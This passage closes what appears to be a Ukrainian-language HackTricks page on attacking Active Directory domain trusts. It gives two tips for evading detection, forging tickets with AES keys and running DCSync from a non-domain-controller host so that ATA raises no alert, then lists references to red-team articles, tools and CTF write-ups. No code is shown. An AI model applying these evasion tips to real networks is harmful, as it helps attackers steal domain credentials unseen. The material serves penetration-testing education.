- **Імперсонація квитків**: використання ключів **aes** для створення квитків допомагає уникнути виявлення, не виконуючи downgrade до NTLM.
- **Атаки DCSync**: рекомендується виконувати їх із non-Domain Controller, щоб уникнути виявлення ATA, оскільки безпосереднє виконання з Domain Controller спричинить alerts.

## References

- [1] [Посібник з атак на доменні trust-зв’язки](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Підроблення trust-зв’язків для deception в Active Directory](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [Від Domain Admin до Enterprise Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [Колекція LDAP BOF – In-Memory LDAP Toolkit для експлуатації Active Directory](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – Holy Shuck! Перетворення NTLM-хешів на wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – аналіз Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon - Onelogon: захоплення облікових записів Active Directory через Netlogon](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft - Як керувати змінами в захищених з’єднаннях каналу Netlogon, пов’язаними з CVE-2020-1472](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [Подорож до забутих інтерфейсів Null Session і MS-RPC](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [SID filter як межа безпеки між доменами? (Частина 4) - дослідження обходу SID filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [SID filter як межа безпеки між доменами? (Частина 5) - атака Golden GMSA trust - від дочірнього домену до батьківського](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [SID filter як межа безпеки між доменами? (Частина 6) - атака Schema change trust - від дочірнього домену до батьківського](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [Від DA до EA за допомогою ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [Ескалація від адміністраторів дочірнього домену до enterprise admins за 5 хвилин через зловживання AD CS: продовження](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [ACE в рукаві: проєктування бекдорів Active Directory DACL](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
- [18] [Вихідний код модуля NetExec pre2k](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/pre2k.py)
- [19] [Microsoft ADSchema - атрибут msDS-GroupMSAMembership](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [20] [0xdf - HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
{{#include ../../banners/hacktricks-training.md}}
